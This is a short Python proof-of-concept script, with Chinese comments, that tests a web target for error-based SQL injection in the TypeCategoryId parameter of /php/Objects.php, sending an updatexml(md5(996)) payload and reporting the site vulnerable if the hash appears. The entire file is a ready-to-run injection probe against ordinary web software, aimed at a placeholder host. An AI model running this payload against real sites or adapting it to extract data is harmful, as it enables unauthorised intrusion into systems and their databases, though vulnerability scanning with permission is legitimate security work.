# coding:utf-8
import requests as req
def verify(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
    }
    payload="/php/Objects.php?Action=ChangeCategory&TypeCategoryId=1%20and%20updatexml(1,md5({}),1)%20--+".format(996) #注入成功执行md5对996的加密结果
    resp1 = req.get(target+payload, headers=headers, timeout=30, verify=False, allow_redirects=False)
    if "b8aff0438617c055eb55f0ba5d226fa" in resp1.text and resp1.status_code == 200: #b8为md5 996的编码
        print (target + "，存在漏洞")
        return True
    return False
if __name__ == '__main__':
    verify("https://lpone")